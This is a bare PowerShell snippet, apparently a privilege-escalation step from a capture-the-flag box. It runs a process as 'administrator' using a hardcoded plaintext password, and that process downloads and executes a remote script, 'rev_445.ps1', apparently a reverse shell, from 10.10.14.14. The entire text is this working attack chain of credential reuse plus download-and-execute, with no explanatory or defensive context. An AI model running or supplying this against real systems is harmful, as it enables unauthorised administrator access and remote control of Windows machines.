$passwd = ConvertTo-SecureString 'Umbracoadmin123!!' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('administrator', $passwd)
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.14.14/rev_445.ps1')" -Credential $creds
